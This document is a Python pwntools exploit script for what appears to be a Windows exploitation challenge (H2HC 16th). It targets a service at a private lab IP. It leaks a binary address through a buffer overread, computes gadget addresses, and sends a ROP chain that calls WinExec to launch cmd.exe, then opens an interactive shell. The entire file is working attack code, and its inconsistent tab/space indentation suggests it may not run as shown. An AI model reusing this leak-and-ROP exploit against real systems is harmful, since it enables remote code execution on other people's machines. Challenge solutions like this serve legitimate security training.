from pwn import *
 
LOCAL = False

def main():
  global target

	log.info("H2HC 16th Windows Exploitation Challenge - mphx2\n\n")
	log.info("Leaking binary address:\n")
		
	target = remote("192.168.63.131", 54345)
	target.sendline("H2HC"+p32(0xff)+"\x10"*0xfe+"\x00")
  target.close()
  target = remote("192.168.63.131", 54345)
	target.sendline("H2HC"+p32(0xff)+"\x01"*0x1)
		
	leak_bin = target.recv(0x200)
	leak_bin = u64(leak_bin[0x120:0x128])
		
	log.success ("leaked binary address: %#x\n", leak_bin)
	bin_base_address = leak_bin - 0x1a6b
	log.success ("base binary address:   %#x\n",bin_base_address)

	winexec_pointer = bin_base_address + 0xedb8 - 0x66# due to the jmp rsi+0x66
	log.success ("winexec pointer adddr-0x66: %#x\n", winexec_pointer)
	pop_rsi_gadget = bin_base_address + 0x5fb9 
	log.success ("pop_rsi_ret gadget:    %#x\n", pop_rsi_gadget)
	jmp_rsi_gadget = bin_base_address + 0x7d34
	log.success ("jmp rsi+0x66 gadget:   %#x\n", jmp_rsi_gadget)

	cmd_exe = bin_base_address +0xe4b4
	pop_r14 = bin_base_address + 0x86ba
	pop_rdi = bin_base_address + 0x1aa5
	mov_rcx_rdi = bin_base_address + 0x16e0

	log.info("Exploiting\n")

	rop_payload = p64(pop_rsi_gadget)
	rop_payload += "E"*12
	rop_payload += p64(winexec_pointer)
	rop_payload += p64(pop_r14)
	rop_payload += p64(jmp_rsi_gadget)
	rop_payload += p64(pop_rdi)
	rop_payload += p64(cmd_exe)
	rop_payload += p64(mov_rcx_rdi)
	
	target = remote("192.168.63.131", 54345)
  target.sendline("H2HC"+p32(0xff)+"A"*(240))
  target.close()
  target = remote("192.168.63.131", 54345)
  #raw_input()
  target.send("H2HC"+p32(0xff)+"cmd.exe\x0a"+"B"*(0xf7)+"\x01"+"\x01"*12+rop_payload+"D"*0x48)
  target.interactive()

 
if __name__ == "__main__":
	main()
